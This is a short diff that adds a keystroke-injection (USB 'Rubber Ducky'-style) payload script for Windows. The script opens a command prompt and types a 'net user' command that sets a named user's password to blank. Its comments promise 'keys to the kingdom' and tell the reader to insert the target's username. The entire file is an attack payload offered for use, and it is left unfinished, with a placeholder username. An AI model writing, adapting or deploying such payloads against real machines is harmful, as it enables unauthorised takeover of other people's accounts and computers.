@@ -1,0 +1,10 @@
+REM This payload will remove the current users password and give you keys to the kingdom
+
+WINDOWS
+STRING cmd
+ENTER
+DELAY 500
+
+REM It is important that you change to the target username below, will continue to work on copy/pasting from cmd prompt
+
+STRING net user USERNAME HERE ""
